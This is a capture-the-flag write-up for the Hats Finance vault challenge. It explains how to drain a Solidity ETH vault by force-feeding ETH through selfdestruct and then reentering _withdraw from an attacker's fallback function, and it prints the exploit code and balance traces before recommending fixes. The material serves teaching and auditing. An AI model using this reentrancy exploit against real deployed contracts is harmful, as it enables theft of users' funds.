# The Hats Challenge

The [`Vault.sol`](https://github.com/hats-finance/vault-game/blob/main/contracts/Vault.sol) is deployed with the contract owning 1 ETH of the shares.

Your mission is to capture the flag by emptying the vault, then calling `captureTheFlag` with an address you control to prove that you have succeeded in completing the challenge, so that `vault.flagHolder` returns your address.

Link to challenge: https://github.com/hats-finance/vault-game

## Solution

The solution is implemented in [Vault.t.sol](https://github.com/chad-mcdonald/hats-finance-ctf2-vault-challenge/blob/master/test/Vault.t.sol)

Run the solution using [forge](https://github.com/foundry-rs/foundry):

```bash
forge test -vvv
```
## Write-up

Vault has a vulnerable `_withdraw` function that may be reentered to drain the contract of all assets. 

This exploit relies on chaining two vulnerabilities together.
1. Increasing the balance of `vault.totalAssets()` without minting additional shares by force feeding the Vault ETH via `selfdestruct`.
2. Exploiting a reentrancy in `_withdraw` to send the `vault.owner()` the `excessETH`.

```solidity
    function _withdraw(
        address caller,
        address payable receiver,
        address _owner,
        uint256 amount
    ) internal virtual {

	if (caller != _owner) {
        _spendAllowance(_owner, caller, amount);
    }

    uint256 excessETH = totalAssets() - totalSupply(); // @audit selfdestruct may be used to increase totalAssets without increasing totalSupply
        
    _burn(_owner, amount);
    
    Address.sendValue(receiver, amount); // @audit reentrant call
    if (excessETH > 0) {
        Address.sendValue(payable(owner()), excessETH);
    }

    emit Withdraw(caller, receiver, _owner, amount, amount);
}
```

## Proof of concept
1. Attacker funds and deploys an expendable contract with 1 ETH and calls `expendableContract.selfdestruct(vaultAddress)` which deletes the expendable contract and forces the `vaultAddress` to accept the 1 ETH even though it has no `fallback` or `receive` functions. 
   
   By using `selfdestruct` the ETH is deposited in the Vault without calling `deposit` or `mint`, which **bypasses the minting of shares**, this has the effect of raising `totalAssets()` > `totalSupply()` (ie amount of assets (ETH) is > amount of shares). This is a problem since shares and assets are **supposed to be minted at a ratio of 1:1 in this vault**.
   
   Now when `uint256 excessETH = totalAssets() - totalSupply()` is calculated in `vault._withdraw()` this is the result:
 ```solidity
 uint256 excessETH = totalAssets() - totalSupply();
 // totalAssets() == 2 ETH
 // totalSupply() == 1 ETH worth of shares
 // excessETH == 1 ETH
 ```

2. The attacker then calls `vault.mint` and mints 1 ETH worth of shares to the attacker. The resulting balances are now:
 ```solidity
 uint256 excessETH = totalAssets() - totalSupply();
 // totalAssets() == 3 ETH
 // totalSupply() == 2 ETH worth of shares
 // excessETH == 1 ETH
 // 
 // attacker has 1 ETH of shares
 // contract has 1 ETH of shares
 ```

3. Attacker redeems 0.5 ETH worth of shares with  `vault.redeem` which calls `vault._withdraw` to send ETH to the attacker using `Address.sendValue(receiver, amount).

```solidity
    function _withdraw(
        address caller,
        address payable receiver,
        address _owner,
        uint256 amount
    ) internal virtual {
        if (caller != _owner) {
            _spendAllowance(_owner, caller, amount);
        }

        uint256 excessETH = totalAssets() - totalSupply(); 
        
        _burn(_owner, amount);
        
        Address.sendValue(receiver, amount); // @audit reentrant call which allows the attacker to run arbitrary code in their fallback function
        
        if (excessETH > 0) {
            Address.sendValue(payable(owner()), excessETH);
        }

        emit Withdraw(caller, receiver, _owner, amount, amount);
}
```

4. The attacker's contract contains a fallback function, triggered by recieving ETH, which calls `vault.redeem` to redeem the other half of their shares.

```solidity
fallback() external payable {
        emit ReceivedETH(msg.sender, msg.value);
        uint256 withdrawAmount = ERC4626ETH(vault).maxWithdraw(exploiter);

        if (withdrawAmount > 0) {
            ERC4626ETH(vault).redeem(withdrawAmount, exploiter, exploiter);
        }
}
```

5. The attackers fallback above will call `vault.redeem` which will call  `vault._withdraw` and send the attacker the other half of ETH assets per their shares. So the attacker recieves 0.5 ETH on the first call, and 0.5 ETH on the reentrant call for a total of 1 ETH.
 
6. However, because of the reentrancy the code below is executed twice with `excessETH == 1 ETH`.  This sends the `Vault.owner()` 1 more ETH than they are owed per their share of the Vault.
```solidity
if (excessETH > 0) {
    Address.sendValue(payable(owner()), excessETH); //sends excessETH to deployer which is the owner of contract
}
```

The two reentrant calls will each send 1 ETH to `owner()` which leaves the Vault with 0 assets and 1 ETH worth of shares.

## Recommendations

There are a few ways to fix this issue. 

1. Use a nonReentrant modifier on the `withdraw` and `redeem` functions. This will prevent an attacker from reentering the `_withdraw` function upon recieving ETH.
2. Remove the  `excessETH` check from the `_withdraw` function. Write a separate function to allow the `vault.owner()` to remove excess Ether. This fix has the additional benefit of saving users gas by removing a wasteful if statement from the `_withdraw` function.
3. Move  `uint256 excessETH = totalAssets() - totalSupply()` below `Address.sendValue(receiver, amount)`. This ensures `excessETH` is set after the reentrant `Address.sendValue` call.
